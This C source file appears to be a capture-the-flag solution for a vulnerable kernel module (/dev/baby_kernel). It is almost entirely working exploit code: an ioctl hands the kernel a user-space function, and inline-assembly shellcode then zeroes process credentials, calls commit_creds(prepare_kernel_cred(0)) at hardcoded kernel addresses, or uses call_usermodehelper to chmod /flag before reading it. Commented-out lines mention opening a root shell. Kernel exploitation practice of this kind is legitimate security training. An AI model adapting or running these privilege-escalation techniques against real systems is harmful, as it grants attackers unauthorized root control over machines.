#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BABY_KERNEL_IOCTL 0xffffffffc00000c0
#define PREPARE_KERNEL_CREDS 0xffffffff81094670
#define COMMIT_CREDS 0xffffffff810943d0
#define CALL_USERMODEHELPER 0xffffffff81086630

// set zeros to creds 
void shellcode_1(){
    /* volatile: do not optimize the assembly code */
    asm volatile(
        "mov rdi, gs:0x1AD00\n"  /* move in rdi the pointer to the struct */
        "mov rsi, [rdi+0x740]\n" /* the pointer to real_cred in rsi       */
        "mov QWORD PTR [rsi+0x8], 0\n"
        "mov QWORD PTR [rsi+0x10], 0\n"
        "mov QWORD PTR [rsi+0x18], 0\n"
        "mov QWORD PTR [rsi+0x20], 0\n"
    );
}

// commit_creds(prepare_kernel_creds(0))
void shellcode_2() {
    unsigned long long *root_creds;
    asm volatile(
        "mov rax, %0\n" 
        "mov rdi, 0\n"
        "call rax\n"
        : "=a"(root_creds) //outputs
        : "r"(PREPARE_KERNEL_CREDS) //inputs
        : "rdi" //clobbered registers
    );
    //printf("root_creds: %p\n", root_creds);
    asm volatile(
        "mov rax, %0\n"
        "mov rdi, %1\n"
        "call rax\n"
        :
        : "r"(COMMIT_CREDS),"r"(root_creds)
        : "rdi", "rax"
    );
}

// commit_creds(prepare_kernel_creds(0))
void shellcode_2_easier() {
    unsigned long long *root_creds;
    asm volatile(
        "mov rdi, 0\n"
        "mov rax, 0xffffffff81094670\n"
        "call rax\n"
        "mov rdi, rax\n"
        "mov rax, 0xffffffff810943d0\n"
        "call rax\n"
    );
}

// call_usermodehelper("/bin/chown", argv, 0)
//const char* argv[] = {"/bin/chown\0", "1000:1000\0", "/flag\0" , NULL};
const char* argv[] = {"/bin/chmod\0", "+r\0", "/flag\0" , NULL};

void shellcode_3(){
    asm volatile(
        "mov rdi, %0\n"
        "mov rsi, %1\n"
        "mov rdx, 0\n"
        "mov r10, 2\n"
        "mov rax, 0xffffffff81086630\n"
        "call rax\n"
        :
        :"r"(argv[0]), "r"(argv), "r"(CALL_USERMODEHELPER)
        :"rdi", "rsi", "rdx", "r10", "rax"
    );
}

int main() {
    int fd;
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    fd = open("/dev/baby_kernel", O_RDWR);
    if (fd < 0) {
        printf("open error\n");
        return -1;
    }
    
    printf("File opened. fd = %d\n", fd);

    ioctl(fd, 1337, shellcode_1);
    /* here we should be root */
    // we can simply pop a shell
    // system("/bin/sh");
    // or read the flag

    fd = open("/flag", O_RDONLY);
    if (fd < 0) {
        printf("open flag error\n");
        return -1;
    }
    char buf[0x100];
    read(fd, buf, 0x100);
    printf("%s\n", buf);
    return 0;
}